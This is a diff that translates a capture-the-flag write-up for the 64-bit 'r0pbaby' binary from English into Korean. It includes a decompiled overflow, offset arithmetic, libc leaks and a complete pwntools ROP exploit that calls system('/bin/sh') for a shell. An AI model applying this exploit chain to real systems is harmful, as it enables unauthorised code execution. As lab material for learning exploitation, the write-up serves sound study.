@@ -25,9 +25,9 @@ authors:
     FORTIFY:  Enabled
 ```
 
-PIE is enabled but there is no stack canary. NX is enabled, so we cannot execute shellcode on the stack — we need a ROP chain. Conveniently, the binary exposes menu options that leak both the libc base address and the address of any libc symbol.
+PIE는 활성화되어 있지만 스택 카나리는 없다. NX가 활성화되어 있으므로 스택에서 셸코드를 직접 실행할 수는 없다 — ROP 체인이 필요하다. 다행히 바이너리는 libc 베이스 주소와 임의의 libc 심볼 주소를 노출하는 메뉴 옵션을 제공한다.
 
-## Program Execution
+## 프로그램 실행
 
 ```bash
 ➜  r0pbaby ./r0pbaby
@@ -57,13 +57,13 @@ Symbol system: 0x00007F1257F0F410
 Exiting.
 ```
 
-The program opens `libc.so.6` via `dlopen`, then exposes three primitives:
+프로그램은 `dlopen`으로 `libc.so.6`을 열고, 세 가지 프리미티브를 노출한다:
 
-- **Option 1** — prints the handle returned by `dlopen`, which is the libc base address
-- **Option 2** — calls `dlsym` with a user-supplied symbol name, then prints the resolved address
-- **Option 3** — reads up to 1024 bytes into `nptr` and copies them directly onto the stack via `memcpy`
+- **옵션 1** — `dlopen`이 반환한 핸들을 출력하는데, 이것이 libc 베이스 주소다.
+- **옵션 2** — 사용자가 제공한 심볼 이름으로 `dlsym`을 호출하고 해석된 주소를 출력한다.
+- **옵션 3** — 최대 1024바이트를 `nptr`로 읽은 뒤 `memcpy`로 스택에 직접 복사한다.
 
-## Source Analysis
+## 소스 분석
 
 ```c
 __int64 __fastcall main(int a1, char **a2, char **a3)
@@ -100,41 +100,41 @@ __int64 __fastcall main(int a1, char **a2, char **a3)
     {
       ...
 LABEL_22:
-      memcpy(&savedregs, nptr, length);  // overflow here
+      memcpy(&savedregs, nptr, length);  // 여기서 오버플로우 발생
     }
   }
   ...
 }
 ```
 
-The key vulnerability is in option 3. After reading a byte count from the user, the binary reads that many bytes into `nptr[1088]` and then calls:
+핵심 취약점은 옵션 3에 있다. 사용자로부터 바이트 수를 읽은 뒤, 해당 바이트 수만큼 `nptr[1088]`로 읽어들이고 다음을 호출한다:
 
 ```c
 memcpy(&savedregs, nptr, length);
 ```
 
-`savedregs` is at `[rbp+0]`, meaning it sits immediately at the saved RBP on the stack. The `nptr` buffer starts at `[rbp-0x440]` (1088 bytes before saved RBP). So writing more than 8 bytes past the start of `savedregs` overwrites the return address.
+`savedregs`는 `[rbp+0]`에 위치하므로, 스택의 저장된 RBP 바로 위에 있다. `nptr` 버퍼는 `[rbp-0x440]`에서 시작한다(저장된 RBP보다 1088바이트 아래). 따라서 `savedregs` 시작점에서 8바이트 이상을 쓰면 리턴 주소를 덮어쓰게 된다.
 
-The binary is stripped, so we cannot use `nm` or a debugger symbol lookup to find the exact offset:
+바이너리는 스트립되어 있으므로 `nm`이나 디버거 심볼 조회로 정확한 오프셋을 찾을 수 없다:
 
 ```bash
 ➜  r0pbaby nm r0pbaby
 nm: r0pbaby: no symbols
 ```
 
-We determine the offset empirically: `nptr` is at `[rbp-0x440]` and `savedregs` is at `[rbp+0]`, so from `nptr` to the saved return address is `0x440 + 8 = 0x448` (1096) bytes.
+오프셋은 경험적으로 계산한다: `nptr`은 `[rbp-0x440]`에, `savedregs`는 `[rbp+0]`에 있으므로 `nptr`에서 저장된 리턴 주소까지는 `0x440 + 8 = 0x448`(1096)바이트다.
 
-## Exploit Strategy
+## 익스플로잇 전략
 
-Since there is no stack canary and no ASLR protection for our own payload (we supply the exact addresses), the plan is:
+스택 카나리가 없고 자체 페이로드에 대한 ASLR 보호도 없으므로(정확한 주소를 직접 제공하므로), 계획은 다음과 같다:
 
-1. Use option 1 to leak the libc base
-2. Use option 2 to leak the address of `system` and find a `pop rdi ; ret` gadget inside libc
-3. Use option 3 to write a ROP chain: `[padding] [pop rdi ; ret] ["/bin/sh" addr] [system addr]`
+1. 옵션 1로 libc 베이스를 누출한다.
+2. 옵션 2로 `system` 주소를 누출하고 libc 내의 `pop rdi ; ret` 가젯을 찾는다.
+3. 옵션 3으로 ROP 체인을 작성한다: `[패딩] [pop rdi ; ret] ["/bin/sh" 주소] [system 주소]`
 
-### Finding the gadget
+### 가젯 찾기
 
-We need `pop rdi ; ret` to set the first argument for `system`. Because PIE is enabled and the binary is stripped, we search libc directly:
+`system`의 첫 번째 인자를 설정하기 위해 `pop rdi ; ret`이 필요하다. PIE가 활성화되어 있고 바이너리는 스트립되어 있으므로 libc를 직접 검색한다:
 
 ```python
 from pwn import *
@@ -144,9 +144,9 @@ rop  = ROP(libc)
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 ```
 
-At runtime the gadget address is `libc_base + pop_rdi_offset`.
+런타임에 가젯 주소는 `libc_base + pop_rdi_offset`이다.
 
-## Exploit
+## 익스플로잇
 
 ```python
 from pwn import *
@@ -184,11 +184,11 @@ rop_libc   = ROP(libc)
 pop_rdi    = libc_base + rop_libc.find_gadget(['pop rdi', 'ret'])[0]
 ret_gadget = libc_base + rop_libc.find_gadget(['ret'])[0]
 
-# Offset from nptr to saved RIP: 0x440 (nptr size) + 8 (saved RBP)
+# nptr에서 저장된 RIP까지 오프셋: 0x440 (nptr 크기) + 8 (저장된 RBP)
 padding = b'A' * (0x440 + 8)
 
 payload  = padding
-payload += p64(ret_gadget)   # stack alignment for system()
+payload += p64(ret_gadget)   # system()을 위한 스택 정렬
 payload += p64(pop_rdi)
 payload += p64(bin_sh)
 payload += p64(system)
@@ -198,24 +198,24 @@ send_rop(payload)
 p.interactive()
 ```
 
-### Stack layout at the point of `memcpy`
+### `memcpy` 시점의 스택 레이아웃
 
 ```
-[rsp]           → nptr[0]          ← start of our controlled data
+[rsp]           → nptr[0]          ← 우리가 제어하는 데이터의 시작
 ...
 [rbp-0x440]    → nptr[0]
-[rbp+0x00]     → saved RBP        ← overwritten with 'AAAA....'
-[rbp+0x08]     → saved RIP        ← overwritten with ret gadget
+[rbp+0x00]     → 저장된 RBP       ← 'AAAA....'으로 덮어씀
+[rbp+0x08]     → 저장된 RIP       ← ret 가젯으로 덮어씀
 [rbp+0x10]     ← pop rdi ; ret
-[rbp+0x18]     ← /bin/sh address
+[rbp+0x18]     ← /bin/sh 주소
 [rbp+0x20]     ← system()
 ```
 
-## Summary
+## 요약
 
-r0pbaby is a straightforward introduction to 64-bit ROP. The binary deliberately hands us both a libc base leak and symbol resolution, leaving only the stack write primitive and gadget chaining as the actual challenge. Key takeaways:
+r0pbaby는 64비트 ROP의 간단한 입문 문제다. 바이너리가 의도적으로 libc 베이스 누출과 심볼 해석 기능을 제공하므로, 실제 과제는 스택 쓰기 프리미티브와 가젯 체이닝만 남는다. 핵심 포인트:
 
-- `dlopen` handle == shared library load address, directly usable as a base
-- `dlsym` resolves symbols at runtime, giving precise function addresses without ASLR brute force
-- 64-bit calling convention requires the first argument in `rdi`; a `pop rdi ; ret` gadget is the standard setup
-- Stack alignment to 16 bytes before calling `system` prevents `movaps` crashes in glibc
+- `dlopen` 핸들 == 공유 라이브러리 로드 주소로, 베이스로 바로 사용 가능하다.
+- `dlsym`은 런타임에 심볼을 해석하여 ASLR 브루트포스 없이 정확한 함수 주소를 제공한다.
+- 64비트 호출 규약에서 첫 번째 인자는 `rdi`에 들어간다; `pop rdi ; ret` 가젯이 표준 설정 방법이다.
+- `system` 호출 전 16바이트 스택 정렬이 필요하다 — 정렬이 안 되면 glibc의 `movaps` 명령이 크래시를 일으킨다.
